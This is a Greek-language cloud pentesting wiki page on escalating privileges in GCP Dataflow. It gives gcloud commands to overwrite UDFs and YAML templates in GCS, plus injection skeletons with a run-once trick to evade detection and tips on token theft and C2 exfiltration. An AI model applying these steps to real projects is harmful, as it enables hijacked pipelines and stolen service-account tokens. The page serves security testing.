# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow δεν επικυρώνει την ακεραιότητα των UDFs και των YAMLs προτύπων εργασιών που αποθηκεύονται σε GCS.
Με πρόσβαση εγγραφής στο bucket, μπορείτε να αντικαταστήσετε αυτά τα αρχεία για να εγχύσετε κώδικα, να εκτελέσετε κώδικα στους workers, να κλέψετε service account tokens, ή να τροποποιήσετε την επεξεργασία δεδομένων.
Τόσο οι batch όσο και οι streaming pipeline εργασίες αποτελούν βιώσιμους στόχους για αυτήν την επίθεση. Για να εκτελέσετε αυτήν την επίθεση σε ένα pipeline πρέπει να αντικαταστήσετε UDFs/templates πριν ξεκινήσει η εργασία, κατά τα πρώτα λεπτά (πριν δημιουργηθούν οι job workers) ή κατά τη διάρκεια της εκτέλεσης πριν δημιουργηθούν νέοι workers (λόγω autoscaling).

**Attack vectors:**
- **UDF hijacking:** Python (`.py`) και JS (`.js`) UDFs που αναφέρονται από pipelines και αποθηκεύονται σε customer-managed buckets
- **Job template hijacking:** Custom YAML ορισμοί pipeline που αποθηκεύονται σε customer-managed buckets


> [!WARNING]
> **Run-once-per-worker trick:** Τα Dataflow UDFs και τα template callables καλούνται **per row/line**. Χωρίς συντονισμό, exfiltration ή κλοπή tokens θα τρέξει χιλιάδες φορές, προκαλώντας θόρυβο, rate limiting και ανίχνευση. Χρησιμοποιήστε ένα πρότυπο **file-based coordination**: ελέγξτε αν ένα αρχείο-δείκτης (π.χ. `/tmp/pwnd.txt`) υπάρχει στην αρχή· αν υπάρχει, παραλείψτε τον κακόβουλο κώδικα· αν όχι, τρέξτε το payload και δημιουργήστε το αρχείο. Αυτό εξασφαλίζει ότι το payload εκτελείται **μία φορά ανά worker**, όχι ανά γραμμή.


#### Direct exploitation via gcloud CLI

1. Καταγράψτε τις Dataflow εργασίες και εντοπίστε τα μονοπάτια template/UDF στο GCS:

<details>

<summary>List των jobs και χρήση του describe για να λάβετε το template path, το staging location, και τις αναφορές σε UDF</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. Κατεβάστε το αρχικό UDF ή το template εργασίας από το GCS:

<details>

<summary>Κατεβάστε το αρχείο UDF ή το YAML template από το bucket</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. Επεξεργαστείτε το αρχείο τοπικά: εισάγετε το κακόβουλο payload (βλέπε Python UDF ή αποσπάσματα YAML παρακάτω) και βεβαιωθείτε ότι χρησιμοποιείται το μοτίβο συντονισμού run-once.

4. Ανεβάστε ξανά για να επαναγράψετε το αρχικό αρχείο:

<details>

<summary>Αντικαταστήστε UDF ή template στο bucket</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. Περιμένετε την επόμενη εκτέλεση της εργασίας, ή (για streaming) πυροδοτήστε autoscaling (π.χ. κατακλύστε την είσοδο του pipeline) ώστε νέοι workers να ξεκινήσουν και να κάνουν pull το τροποποιημένο αρχείο.

#### Python UDF injection

Εάν θέλετε ο worker να exfiltrate δεδομένα στο C2 server, χρησιμοποιήστε `urllib.request` και όχι `requests`.
Το `requests` δεν είναι προεγκατεστημένο στους classic Dataflow workers.

<details>

<summary>Κακόβουλο UDF με συντονισμό μίας εκτέλεσης και εξαγωγή μεταδεδομένων</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### YAML injection προτύπου εργασίας

Εισάγετε ένα βήμα `MapToFields` με μια callable που χρησιμοποιεί ένα αρχείο συντονισμού. Για pipelines που βασίζονται σε YAML και υποστηρίζουν το `requests`, χρησιμοποιήστε το αν το template δηλώνει `dependencies: [requests]`; διαφορετικά προτιμήστε το `urllib.request`.

Προσθέστε το βήμα καθαρισμού (`drop: [malicious_step]`) έτσι ώστε το pipeline να γράφει ακόμα έγκυρα δεδομένα στον προορισμό.

<details>

<summary>Κακόβουλο βήμα MapToFields και καθαρισμός στο YAML του pipeline</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Πρόσβαση Compute Engine σε Dataflow Workers

**Δικαιώματα:** `compute.instances.osLogin` ή `compute.instances.osAdminLogin` (με `iam.serviceAccounts.actAs` πάνω στο worker SA), ή `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (με `iam.serviceAccounts.actAs`) για legacy SSH key injection

Dataflow workers τρέχουν ως Compute Engine VMs. Η πρόσβαση στους workers μέσω OS Login ή SSH σας επιτρέπει να διαβάσετε SA tokens από το metadata endpoint (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`), να χειριστείτε δεδομένα, ή να εκτελέσετε αυθαίρετο κώδικα.

Για λεπτομέρειες εκμετάλλευσης, δείτε:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## Αναφορές

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
